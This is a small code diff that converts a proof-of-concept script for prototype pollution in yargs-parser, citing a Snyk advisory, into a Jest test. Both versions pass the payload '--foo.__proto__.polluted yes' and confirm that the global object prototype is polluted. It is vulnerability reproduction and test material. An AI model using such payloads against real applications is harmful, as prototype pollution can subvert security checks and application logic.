@@ -1,13 +1,11 @@
 //https://snyk.io/vuln/SNYK-JS-YARGSPARSER-560381
 
-const parser = require("yargs-parser");
-const assert = require('assert');
+test("prototype pollution in yargs-parser", () => {
+  expect({}.polluted).toBe(undefined);
 
-var x = {}
-console.log(({}).bar);
-parser('--foo.__proto__.polluted yes');
+  const parser = require("yargs-parser");
 
-console.log(({}).polluted);
-assert({}.polluted === "yes");
-console.log("Payload success!");
+  parser("--foo.__proto__.polluted yes");
 
+  expect({}.polluted).toBe("yes");
+});
